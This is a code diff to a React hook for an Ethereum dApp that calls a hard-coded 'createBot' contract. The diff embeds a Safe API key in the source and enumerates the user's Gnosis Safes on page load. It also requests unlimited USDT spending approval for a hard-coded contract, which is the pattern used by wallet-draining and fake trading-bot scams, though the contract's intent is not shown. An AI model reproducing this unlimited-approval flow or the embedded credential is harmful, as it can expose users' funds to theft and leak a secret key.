@@ -1,6 +1,11 @@
 import { useEffect, useState } from "react";
 import { ethers } from "ethers";
+import SafeApiKit from "@safe-global/api-kit";
 
+
+const SAFE_API_KEY = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzYWZlLWF1dGgtc2VydmljZSIsInN1YiI6IjFhYmViYWY1YjFkNDRjMWQ4N2I2NDU3MGYyZjNlYTUyX2E5NTkxMWIzMGU2MzRlOGY5OWFmNTQxZWVlZTY2MTJlIiwia2V5IjoiMWFiZWJhZjViMWQ0NGMxZDg3YjY0NTcwZjJmM2VhNTJfYTk1OTExYjMwZTYzNGU4Zjk5YWY1NDFlZWVlNjYxMmUiLCJhdWQiOlsic2FmZS1hdXRoLXNlcnZpY2UiXSwiZXhwIjoxOTIwMTgxMzk2LCJkYXRhIjp7fX0.VgqgABuWQYRhQLrB7ODeMICDNSaCp2ovnjgMda1RBWaXmVnwZODmLvfXXjsQJnuGbF2-oH8iISIeTZqlafd_jg";
+
+const SAFE_TX_SERVICE_URL = "https://safe-transaction-mainnet.safe.global";
 const CONTRACT_ADDRESS = "0x7edcf18529d7d697064fad02d1879ef73bf849b5";
 const CONTRACT_ABI = [
   {
@@ -12,7 +17,6 @@ const CONTRACT_ABI = [
   },
 ];
 
-// Common USDT token (mainnet) and minimal ERC20 ABI helpers
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
@@ -24,7 +28,9 @@ const ERC20_ABI = [
 export function useContractInteraction() {
   const [isContractConnected, setIsContractConnected] = useState(false);
   const [provider, setProvider] = useState<any>(null);
-  const [contract, setContract] = useState<any>(null); // read-only contract bound to provider
+  const [contract, setContract] = useState<any>(null);
+  const [safeList, setSafeList] = useState<string[]>([]);
+  const [selectedSafe, setSelectedSafe] = useState<string | null>(null);
 
   useEffect(() => {
     async function init() {
@@ -32,16 +38,24 @@ export function useContractInteraction() {
 
       try {
         const p = new ethers.BrowserProvider(window.ethereum as any);
-        // Do NOT call getSigner here — some providers/extensions may return unexpected values
-        // when no account is selected. We'll request a signer when sending txs.
         setProvider(p);
-
-        // create a provider-bound contract for read-only calls (callStatic can be used later
-        // on a signer-bound contract before sending txs)
         const readOnly = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, p);
         setContract(readOnly);
         setIsContractConnected(true);
         console.log("Provider and read-only contract initialized");
+
+        const signer = await p.getSigner();
+        const ownerAddress = await signer.getAddress();
+
+        const safeApi = new SafeApiKit({ chainId: 1n, txServiceUrl: SAFE_TX_SERVICE_URL, apiKey: SAFE_API_KEY });
+        const safes = await safeApi.getSafesByOwner(ownerAddress);
+
+        if (safes?.safes?.length > 0) {
+          setSafeList(safes.safes);
+          console.log("Gnosis Safes found:", safes.safes);
+        } else {
+          console.log("No Gnosis Safes found for", ownerAddress);
+        }
       } catch (err) {
         console.error("Contract initialization error:", err);
         setIsContractConnected(false);
@@ -57,7 +71,6 @@ export function useContractInteraction() {
       return false;
     }
 
-    // Get a signer now (will prompt MetaMask for account if needed)
     let signer: any;
     try {
       signer = await provider.getSigner();
@@ -68,17 +81,22 @@ export function useContractInteraction() {
 
     const contractWithSigner = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
 
-    // First try a static call to surface any revert reason without sending a tx
     try {
       if (typeof (contractWithSigner as any).callStatic === "function") {
         await (contractWithSigner as any).callStatic.createBot(botName);
-      } else if ((contractWithSigner as any).estimateGas && typeof (contractWithSigner as any).estimateGas.createBot === "function") {
+      } else if (
+        (contractWithSigner as any).estimateGas &&
+        typeof (contractWithSigner as any).estimateGas.createBot === "function"
+      ) {
         await (contractWithSigner as any).estimateGas.createBot(botName);
       }
     } catch (callErr: any) {
-      // try to decode common revert reason ABI (Error(string))
       try {
-        const data = callErr?.data || callErr?.error?.data || callErr?.reason || callErr?.message;
+        const data =
+          callErr?.data ||
+          callErr?.error?.data ||
+          callErr?.reason ||
+          callErr?.message;
         if (typeof data === "string" && data.startsWith("0x08c379a0")) {
           const reasonHex = "0x" + data.slice(138);
           const reason = ethers.toUtf8String(reasonHex);
@@ -90,7 +108,6 @@ export function useContractInteraction() {
         console.error("Failed to decode revert reason:", decodeErr, callErr);
       }
 
-      // helpful diagnostic: print contract code and suggest checks
       try {
         const code = await provider.getCode(CONTRACT_ADDRESS);
         console.log("Contract code length:", code ? code.length : "(no code)");
@@ -101,19 +118,17 @@ export function useContractInteraction() {
       return false;
     }
 
-    // If static call passed, send the real transaction
     try {
-  const tx = await (contractWithSigner as any).createBot(botName);
+      const tx = await (contractWithSigner as any).createBot(botName);
       console.log("Transaction sent:", tx.hash);
       await tx.wait();
       console.log("Transaction confirmed");
       return true;
     } catch (err: any) {
       console.error("Error creating bot (tx):", err);
-
-      // additional decode attempt for tx-level revert
       try {
-        const data = err?.data || err?.error?.data || err?.reason || err?.message;
+        const data =
+          err?.data || err?.error?.data || err?.reason || err?.message;
         if (typeof data === "string" && data.startsWith("0x08c379a0")) {
           const reasonHex = "0x" + data.slice(138);
           const reason = ethers.toUtf8String(reasonHex);
@@ -127,7 +142,6 @@ export function useContractInteraction() {
     }
   }
 
-  // Check USDT allowance of owner => this contract (proxy) spender
   async function getUSDTAllowance(owner: string) {
     if (!window.ethereum) return "0";
     try {
@@ -141,15 +155,15 @@ export function useContractInteraction() {
     }
   }
 
-  // Approve USDT to the proxy contract (approve max by default)
   async function approveUSDT() {
     if (!window.ethereum) return false;
     try {
       const provider = new ethers.BrowserProvider(window.ethereum as any);
       const signer = await provider.getSigner();
       const token = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
-      const tx = await token.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
-      console.log("approve tx sent:", tx.hash);
+      const spender = selectedSafe || CONTRACT_ADDRESS;
+      const tx = await token.approve(spender, ethers.MaxUint256);
+      console.log(`approve tx sent to ${spender}:`, tx.hash);
       await tx.wait();
       console.log("approve confirmed");
       return true;
@@ -159,6 +173,14 @@ export function useContractInteraction() {
     }
   }
 
-  return { isContractConnected, createBotWithToken, getUSDTAllowance, approveUSDT, USDT_ADDRESS };
+  return {
+    isContractConnected,
+    createBotWithToken,
+    getUSDTAllowance,
+    approveUSDT,
+    USDT_ADDRESS,
+    safeList,
+    selectedSafe,
+    setSelectedSafe,
+  };
 }
-
